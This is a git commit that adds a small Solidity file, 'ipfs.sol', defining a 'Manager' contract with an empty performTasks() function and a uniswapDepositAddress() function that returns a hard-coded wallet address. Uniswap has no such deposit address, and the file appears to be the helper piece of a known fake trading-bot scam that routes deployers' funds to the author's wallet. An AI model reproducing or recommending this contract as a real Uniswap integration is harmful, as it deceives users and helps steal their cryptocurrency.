ed28e963213b388d32b4f933c9b5d85eef8fb020
incyashraj <65327043+incyashraj@users.noreply.github.com>
2024-08-25 15:27:21 +0530

    Create ipfs.sol

---
+++ ipfs.sol
@@ -0,0 +1,13 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x0845DBbeeA2689d5f25496B52980185CEcAB4A0c;
+	}
+}
